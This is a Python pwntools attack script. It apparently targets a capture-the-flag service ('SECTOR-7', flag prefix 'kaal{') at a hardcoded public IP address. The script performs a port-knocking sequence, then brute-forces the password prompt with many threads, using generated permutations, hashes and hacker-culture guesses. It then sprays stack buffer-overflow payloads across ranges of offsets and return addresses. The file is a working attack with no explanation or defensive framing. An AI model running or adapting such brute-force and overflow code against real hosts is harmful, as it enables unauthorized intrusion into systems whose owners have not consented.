#!/usr/bin/env python3
"""
NUCLEAR ATTACK - Try everything simultaneously
"""

from pwn import *
import threading
import time
import hashlib
import itertools

context.log_level = 'error'

target_ip = "13.206.58.35"
target_port = 9999
found_flag = None

def knock():
    for port in [9000, 2600, 1337]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((target_ip, port))
            s.close()
        except:
            pass
        time.sleep(0.1)
    time.sleep(0.5)

def try_password(pwd):
    global found_flag
    if found_flag:
        return
    
    try:
        knock()
        conn = remote(target_ip, target_port)
        conn.recvuntil(b"password:", timeout=2)
        conn.sendline(pwd.encode() if isinstance(pwd, str) else pwd)
        
        response = conn.recvall(timeout=1)
        conn.close()
        
        resp_text = response.decode('utf-8', errors='ignore')
        
        if "kaal{" in resp_text.lower() or ("flag" in resp_text.lower() and "denied" not in resp_text.lower()):
            found_flag = resp_text
            print(f"\n[!!!] FOUND FLAG with password: {pwd}")
            print(f"Response:\n{resp_text}")
            return True
            
    except:
        pass
    return False

def try_overflow(offset, addr):
    global found_flag
    if found_flag:
        return
    
    try:
        knock()
        conn = remote(target_ip, target_port)
        conn.recvuntil(b"password:", timeout=2)
        
        payload = b"A" * offset + p64(addr)
        conn.sendline(payload)
        
        response = conn.recvall(timeout=1)
        conn.close()
        
        if b"kaal{" in response.lower() or (b"flag" in response.lower() and len(response) > 100):
            found_flag = response.decode('utf-8', errors='ignore')
            print(f"\n[!!!] FOUND FLAG with overflow: offset={offset}, addr={hex(addr)}")
            print(f"Response:\n{found_flag}")
            return True
            
    except:
        pass
    return False

print("[*] NUCLEAR ATTACK ON SECTOR-7")
print("[*] Trying all methods simultaneously...\n")

# Generate massive password list
passwords = []

# Basic combinations
for a, b, c in itertools.permutations([9000, 2600, 1337]):
    passwords.extend([
        f"{a}{b}{c}",
        f"{a}-{b}-{c}",
        f"{a}:{b}:{c}",
        f"{a}_{b}_{c}",
    ])

# With KAAL
for sep in ["-", ":", "_", ""]:
    passwords.extend([
        f"KAAL{sep}9000{sep}2600{sep}1337",
        f"kaal{sep}9000{sep}2600{sep}1337",
    ])

# Hashes
for text in ["KAAL", "kaal", "9000-2600-1337", "SECTOR-7", "sector7"]:
    passwords.append(hashlib.md5(text.encode()).hexdigest())
    passwords.append(hashlib.sha1(text.encode()).hexdigest())
    passwords.append(hashlib.sha256(text.encode()).hexdigest())

# Cultural references
passwords.extend([
    "over9000", "9001", "vegeta", "goku", "saiyan",
    "2600hz", "bluebox", "phreaker", "captaincrunch",
    "elite", "1337", "leet", "h4x0r", "hacker",
    "KAAL", "kaal", "Kaal", "K44L", "k44l",
    "SECTOR7", "sector7", "S3CT0R7",
])

# Try passwords in parallel
print(f"[*] Testing {len(passwords)} passwords...")
threads = []
for pwd in passwords[:100]:  # First 100
    t = threading.Thread(target=try_password, args=(pwd,))
    t.start()
    threads.append(t)
    time.sleep(0.05)
    
    if found_flag:
        break

for t in threads:
    t.join(timeout=1)

if found_flag:
    print(f"\n[SUCCESS] {found_flag}")
    exit(0)

# Try buffer overflow with common addresses
print("\n[*] Trying buffer overflow attacks...")
offsets = [120, 128, 136, 144, 152, 160, 168, 176, 184, 192]
addresses = [
    0x401337, 0x401234, 0x401000, 0x401100, 0x401200,
    0x400900, 0x400a00, 0x400b00, 0x400c00, 0x400d00,
    0x4009000, 0x40090d, 0x401337,
]

threads = []
for offset in offsets:
    for addr in addresses:
        t = threading.Thread(target=try_overflow, args=(offset, addr))
        t.start()
        threads.append(t)
        time.sleep(0.03)
        
        if found_flag:
            break
    if found_flag:
        break

for t in threads:
    t.join(timeout=1)

if found_flag:
    print(f"\n[SUCCESS] {found_flag}")
else:
    print("\n[*] No flag found with current methods")
    print("[*] Trying remaining passwords...")
    
    # Try rest of passwords
    for pwd in passwords[100:]:
        if try_password(pwd):
            break
        time.sleep(0.5)
